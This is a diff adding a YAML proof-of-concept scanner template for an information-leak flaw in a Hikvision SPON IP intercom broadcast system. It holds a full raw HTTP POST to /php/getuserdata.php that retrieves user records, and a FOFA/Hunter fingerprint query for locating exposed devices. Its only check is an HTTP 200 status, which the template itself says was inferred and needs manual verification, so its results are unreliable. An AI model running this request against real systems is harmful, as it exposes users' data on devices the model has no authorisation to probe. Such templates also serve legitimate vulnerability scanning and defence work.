@@ -1,0 +1,44 @@
+id: poc-692378d44f752650a536
+info:
+  name: 海康威视SPONIP网络对讲广播系统getuserdata存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/692378d44f752650a536b6eadf958baa
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 692378d44f752650a536b6eadf958baa
+    fofa: + Hunter：`web.body="vendors/custom/html5.min.js"`
+http:
+- raw:
+  - 'POST /php/getuserdata.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 44
+
+
+    jsondata[pageIndex]=0&jsondata[pageCount]=30'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
